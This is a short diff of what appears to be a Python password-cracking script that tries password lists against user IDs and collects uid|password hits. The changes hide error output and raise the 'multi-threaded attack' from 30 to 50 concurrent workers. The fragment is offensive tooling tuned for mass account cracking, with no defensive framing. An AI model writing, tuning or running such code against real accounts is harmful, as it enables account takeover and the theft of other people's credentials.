@@ -205,7 +205,7 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
@@ -292,7 +292,7 @@ def random_number():
     # Start multi-threaded attack
     start_time = time.time()
     
-    with ThreadPoolExecutor(max_workers=30) as executor:
+    with ThreadPoolExecutor(max_workers=50) as executor:
         futures = []
         
         for random_id in idz:
